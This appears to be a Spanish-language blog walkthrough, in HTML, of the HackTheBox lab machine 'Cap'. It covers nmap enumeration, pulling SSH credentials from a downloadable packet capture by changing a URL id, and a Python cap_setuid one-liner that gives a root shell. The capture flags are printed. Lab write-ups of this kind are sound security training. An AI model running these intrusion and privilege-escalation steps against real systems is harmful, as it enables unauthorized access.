@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB - Cap</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HTB - Cap | d4vlog</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="HTB - Cap" />
+<meta name="author" content="d4vlog" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Sitio Oficial de la maquina" />
+<meta property="og:description" content="Sitio Oficial de la maquina" />
+<link rel="canonical" href="http://localhost:8000/Cap-Page" />
+<meta property="og:url" content="http://localhost:8000/Cap-Page" />
+<meta property="og:site_name" content="d4vlog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-01T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB - Cap" />
+<script type="application/ld+json">
+{"description":"Sitio Oficial de la maquina","@type":"BlogPosting","url":"http://localhost:8000/Cap-Page","dateModified":"2021-10-01T00:00:00-04:00","datePublished":"2021-10-01T00:00:00-04:00","headline":"HTB - Cap","author":{"@type":"Person","name":"d4vlog"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Cap-Page"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>d4vlog@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<!--<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>-->
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>HTB - Cap</h2>
+  <time datetime="2021-10-01T00:00:00-04:00" class="by-line">01 Oct 2021</time>
+  <p><img src="assets/cap-htb.png" alt="Cap" />
+<a href="https://app.hackthebox.eu/machines/Cap">Sitio Oficial de la maquina</a></p>
+
+<p>Cap es una maquina activa de HackTheBox</p>
+
+<h1 id="enumeracion"><a href="#header-1"></a>Enumeracion</h1>
+
+<p>Comenzamos enumerando los puertos con <code class="language-plaintext highlighter-rouge">nmap</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-Pn</span> <span class="nt">-oA</span> target 10.10.10.245
+Nmap scan report <span class="k">for </span>10.10.10.245
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Thu, 09 Sep 2021 23:35:05 GMT
+|     Connection: close
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 232
+|     &lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Thu, 09 Sep 2021 23:34:59 GMT
+|     Connection: close
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 19386
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">"no-js"</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
+|     &lt;title&gt;Security Dashboard&lt;/title&gt;
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"image/png"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/images/icon/favicon.ico"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/bootstrap.min.css"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/font-awesome.min.css"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/themify-icons.css"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/metisMenu.css"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/owl.carousel.min.css"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/slicknav.min.css"</span><span class="o">&gt;</span>
+|     &lt;<span class="o">!</span><span class="nt">--</span> amchar
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Thu, 09 Sep 2021 23:34:59 GMT
+|     Connection: close
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Allow: GET, OPTIONS, HEAD
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     &lt;html&gt;
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;title&gt;Bad Request&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
+|     Invalid HTTP Version &amp;#x27<span class="p">;</span>Invalid HTTP Version: &amp;#x27<span class="p">;</span>RTSP/1.0&amp;#x27<span class="p">;</span>&amp;#x27<span class="p">;</span>
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>9/9%Time<span class="o">=</span>613A96F0%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetRe
+SF:quest,15A0,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20T
+SF:hu,</span><span class="se">\x</span><span class="s2">2009</span><span class="se">\x</span><span class="s2">20Sep</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:34:59</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">
+SF:Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">201938
+SF:6</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">no-js</span><span class="se">\"\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">
+SF:</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">x-ua-compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">ie=edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Security</span><span class="se">\x</span><span class="s2">20Dashboard&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">
+SF:20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1
+SF:</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">shortcut</span><span class="se">\x</span><span class="s2">20icon</span><span class="se">\"\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">image/
+SF:png</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/images/icon/favicon</span><span class="se">\.</span><span class="s2">ico</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;l
+SF:ink</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\</span><span class="s2">
+SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/font
+SF:-awesome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20h
+SF:ref=</span><span class="se">\"</span><span class="s2">/static/css/themify-icons</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\</span><span class="s2">
+SF:"</span>stylesheet<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>/static/css/metisMenu<span class="se">\.</span>css<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
+SF:&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>/static/css/owl<span class="se">\.</span>carousel<span class="se">\.</span>min<span class="se">\.</span>c
+SF:ss<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>/static/cs
+SF:s/slicknav<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20amchar<span class="s2">")%r(HTTPOptions
+SF:,B3,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20200<span class="se">\x</span>20OK<span class="se">\r\n</span>Server:<span class="se">\x</span>20gunicorn<span class="se">\r\n</span>Date:<span class="se">\x</span>20Thu,<span class="se">\x</span>20
+SF:09<span class="se">\x</span>20Sep<span class="se">\x</span>202021<span class="se">\x</span>2023:34:59<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n</span>Content
+SF:-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Allow:<span class="se">\x</span>20GET,<span class="se">\x</span>20OPTIONS,<span class="se">\x</span>20
+SF:HEAD<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>200<span class="se">\r\n\r\n</span><span class="s2">")%r(RTSPRequest,121,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20
+SF:400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/
+SF:html<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>20196<span class="se">\r\n\r\n</span>&lt;html&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;<span class="nb">head</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\</span>
+SF:x20<span class="se">\x</span>20&lt;title&gt;Bad<span class="se">\x</span>20Request&lt;/title&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;/head&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;body&gt;<span class="se">\n</span>
+SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;h1&gt;&lt;p&gt;Bad<span class="se">\x</span>20Request&lt;/p&gt;&lt;/h1&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20Invalid
+SF:<span class="se">\x</span>20HTTP<span class="se">\x</span>20Version<span class="se">\x</span>20&amp;#x27<span class="p">;</span>Invalid<span class="se">\x</span>20HTTP<span class="se">\x</span>20Version:<span class="se">\x</span>20&amp;#x27<span class="p">;</span>RTSP/
+SF:1<span class="se">\.</span>0&amp;#x27<span class="p">;</span>&amp;#x27<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20&lt;/body&gt;<span class="se">\n</span>&lt;/html&gt;<span class="se">\n</span><span class="s2">")%r(FourOhFourRequest,189,
+SF:"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20404<span class="se">\x</span>20NOT<span class="se">\x</span>20FOUND<span class="se">\r\n</span>Server:<span class="se">\x</span>20gunicorn<span class="se">\r\n</span>Date:<span class="se">\x</span>20Th
+SF:u,<span class="se">\x</span>2009<span class="se">\x</span>20Sep<span class="se">\x</span>202021<span class="se">\x</span>2023:35:05<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n</span>C
+SF:ontent-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>20232<span class="se">\r</span>
+SF:<span class="se">\n\r\n</span>&lt;<span class="o">!</span>DOCTYPE<span class="se">\x</span>20HTML<span class="se">\x</span>20PUBLIC<span class="se">\x</span>20<span class="se">\"</span>-//W3C//DTD<span class="se">\x</span>20HTML<span class="se">\x</span>203<span class="se">\.</span>2<span class="se">\x</span>20F
+SF:inal//EN<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n</span>&lt;title&gt;404<span class="se">\x</span>20Not<span class="se">\x</span>20Found&lt;/title&gt;<span class="se">\n</span>&lt;h1&gt;Not<span class="se">\x</span>20Found&lt;/h1&gt;<span class="se">\</span>
+SF:n&lt;p&gt;The<span class="se">\x</span>20requested<span class="se">\x</span>20URL<span class="se">\x</span>20was<span class="se">\x</span>20not<span class="se">\x</span>20found<span class="se">\x</span>20on<span class="se">\x</span>20the<span class="se">\x</span>20serv
+SF:er<span class="se">\.\x</span>20If<span class="se">\x</span>20you<span class="se">\x</span>20entered<span class="se">\x</span>20the<span class="se">\x</span>20URL<span class="se">\x</span>20manually<span class="se">\x</span>20please<span class="se">\x</span>20che
+SF:ck<span class="se">\x</span>20your<span class="se">\x</span>20spelling<span class="se">\x</span>20and<span class="se">\x</span>20try<span class="se">\x</span>20again<span class="se">\.</span>&lt;/p&gt;<span class="se">\n</span><span class="s2">");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Sep  9 19:23:31 2021 -- 1 IP address (1 host up) scanned in 151.88 seconds
+</span></code></pre></div></div>
+<h4 id="comandos-utilizados"><a href="#header-4"></a>Comandos utilizados</h4>
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">-sC:</code> lanza una serie de scripts basicos</p>
+
+  <p><code class="language-plaintext highlighter-rouge">-sV:</code> para detectar el servicio/version del puerto</p>
+
+  <p><code class="language-plaintext highlighter-rouge">-sS:</code> TCP SYNK port scan, se envían solo paquetes de tipo SYN (inicio de conexión) y mediante el tipo de respuesta RST/ACK (no existe)o SYN/ACK (si existe) determina si esta corriendo algún servicio en el puerto</p>
+
+  <p><code class="language-plaintext highlighter-rouge">-p- --open:</code> para que reporte los puertos con estado abierto</p>
+
+  <p><code class="language-plaintext highlighter-rouge">--min-rate 500:</code> para que envie paquetes N paquetes por segundo, esto hace mas rapido el escaneo</p>
+
+  <p><code class="language-plaintext highlighter-rouge">-Pn:</code> indicamos que no realice reconocimiento de host</p>
+
+  <p><code class="language-plaintext highlighter-rouge">-oA:</code> exportamos la informacion en todos los formatos, en caso que quieras hacer un reporte mas detallado</p>
+</blockquote>
+
+<p>Vemos que los puertos <span style="color:green">21 22 80</span> que pertenecen a los servicios <span style="color:green">ftp ssh http</span> estan abiertos.</p>
+
+<p>Probamos iniciar sesion al ftp como <code class="language-plaintext highlighter-rouge">user:anonymous</code> y <code class="language-plaintext highlighter-rouge">password:</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.245
+Connected to 10.10.10.245.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.245:user<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+
+</code></pre></div></div>
+
+<p>Lo siguiente a probar es <code class="language-plaintext highlighter-rouge">whatweb</code> para identificar alguna via potencial de explotacion en el servicio http</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whatweb</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">245</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">245</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">gunicorn</span><span class="p">],</span> 
+<span class="n">IP</span><span class="p">[</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">245</span><span class="p">],</span> <span class="n">JQuery</span><span class="p">[</span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">],</span> <span class="n">Modernizr</span><span class="p">[</span><span class="mi">2</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="n">min</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Security</span> <span class="n">Dashboard</span><span class="p">],</span> 
+<span class="n">X</span><span class="o">-</span><span class="n">UA</span><span class="o">-</span><span class="n">Compatible</span><span class="p">[</span><span class="n">ie</span><span class="o">=</span><span class="n">edge</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Ingresamos al sitio</p>
+
+<p><img src="assets/Cap-site.jpg" alt="cap-site" /></p>
+
+<p>Estamos logueado como el usuario <span style="color:red">Nathan</span> a una pagina donde se registran los logs y estados de la red, desplegamos el menu para ver las opciones</p>
+
+<p><img src="assets/cap-site-menu.jpg" alt="Site-menu" /></p>
+
+<p>Ingresamos a la segunda opcion <span style="color:grey">Security Snapshot (5 second PCAP + Analysis)</span> 
+<code class="language-plaintext highlighter-rouge">PCAP</code> significa “Packet Capture” este archivo contiene los datos de los paquetes enviados a traves de la red, pueden ser analizados con herramientas como <span style="color:cyan">Wireshark</span> para obtener informacion relevante</p>
+
+<p><img src="assets/cap-url.jpg" alt="cap-url" /></p>
+
+<p>En la URL podemos ver unos parametros que hacen referencia al archivo a consultar, si cambiamos el ultimo valor a 0 podriamos obtener los primeros datos generados</p>
+
+<p><img src="assets/cap-url-in.jpg" alt="cap-url-in" /></p>
+
+<p>Descargamos el archivo y lo abrimos con <span style="color:cyan">Wireshark</span></p>
+
+<p><img src="assets/cap-wireshark.jpg" alt="cap-wireshark" /></p>
+
+<p>Analizando el archivo podemos visualizar un usuario y contrasenha</p>
+
+<p><img src="assets/cap-wireshark-user.jpg" alt="cap-wireshark-user" /></p>
+
+<p>Con usuario y contrasenha en mano, nos resta probar el ssh para ver si tenemos acceso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh nathan@10.10.10.245
+nathan@10.10.10.245<span class="s1">'s password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Sep 10 03:26:46 UTC 2021
+
+  System load:  0.0               Processes:             229
+  Usage of /:   36.6% of 8.73GB   Users logged in:       1
+  Memory usage: 22%               IPv4 address for eth0: 10.10.10.245
+  Swap usage:   0%
+
+  =&gt; There are 3 zombie processes.
+
+
+63 updates can be applied immediately.
+42 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Sep 10 01:51:05 2021 from 10.10.14.246
+nathan@cap:~$
+</span></code></pre></div></div>
+
+<p><img src="assets/tenor.gif" alt="baby-yes" width="60px" /> Y estamos dentro</p>
+
+<p>Obtenemos la flag del usuario</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:~<span class="nv">$ </span><span class="nb">cat</span> /home/nathan/user.txt 
+baa7c416ffa3c7e98a020f2e3a789b2f
+</code></pre></div></div>
+<h1 id="escalada-de-privilegios"><a href="#header-1"></a>Escalada de privilegios</h1>
+
+<p>Antes de ejecutar algun escript probemos identificar los permisos <code class="language-plaintext highlighter-rouge">SUDO</code> en caso que tengamos alguno y los binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code></p>
+<blockquote>
+
+  <p>Setuid y Setgid son términos de Unix, abreviaturas para “Set User ID” y “Set Group ID”, respectivamente. Setuid, también llamado a veces “suid”, y “setgid” son permisos de acceso que pueden asignarse a archivos o directorios en un sistema operativo basado en Unix. Se utilizan principalmente para permitir a los usuarios del sistema ejecutar binarios con privilegios elevados temporalmente para realizar una tarea específica. <em><a href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">RedHat-SUID-SGUID</a></em></p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>nathan: 
+Sorry, user nathan may not run <span class="nb">sudo </span>on cap.
+nathan@cap:~<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping <span class="o">=</span> cap_net_raw+ep
+/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
+/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep
+</code></pre></div></div>
+
+<p>El binario <span style="color:green">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span> nos permite manipular arbitrariamente los procesos UIDs. <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities(7) - Linux manual page</a></p>
+
+<p>Una busqueda en <a href="https://gtfobins.github.io/">GTFOBins</a> nos dio el comando para cambiar el <code class="language-plaintext highlighter-rouge">UID</code> del proceso</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nathan</span><span class="o">@</span><span class="n">cap</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span><span class="p">.</span><span class="mi">8</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import os; os.setuid(0); os.system("/bin/sh")'</span>
+<span class="c1"># id
+</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">nathan</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">nathan</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Finalmente obtenemos la flag de root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /root/root.txt</span>
+1dce40766331941da44ca21d2947e19f
+</code></pre></div></div>
+
